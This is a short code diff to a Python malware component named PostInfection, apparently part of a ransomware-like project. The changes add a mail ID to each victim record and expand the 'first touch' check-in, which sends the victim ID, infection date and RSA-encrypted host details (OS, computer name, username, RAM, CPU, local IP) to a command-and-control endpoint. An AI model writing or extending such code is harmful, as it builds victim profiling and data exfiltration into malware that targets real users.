@@ -8,9 +8,10 @@ from utils import resourcePath, aesIV_file_store_path, version
 from hasp.RSACipher import RSACipher
 class PostInfection(object):
 
-    def __init__(self, id, mode, infection_date, rsa_pub_key):
+    def __init__(self, vid, mid, mode, infection_date, rsa_pub_key):
         print("PostInfection Object Created")
-        self.victim_id = id
+        self.victim_id = vid
+        self.mail_id = mid
         self.mode = mode
         self.infection_date = infection_date
         self.rsa_pub_key = rsa_pub_key
@@ -131,19 +132,16 @@ class PostInfection(object):
         """
         POST /api/user/firsttouch
         system information encrypted with RSA public key of victim
-            - id
+            - victim id
+            - mail id
+            - computer infos -> os name, os architecture, os version, computer name, username, ram, cpu
             - infection date
-            - computer name
-            - user name
-            - infection date
-            - ram
-            - cpu
             - local ip
         """
         from requests import post
 
         url = 'middleware/api/user/firsttouch'
-        data = {'id':self.victim_id,'info': encryptedInformations}
+        data = {'id':str(self.victim_id), 'mail_id':str(self.mail_id), 'info': encryptedInformations}
 
         response = post(url, data = data)
 
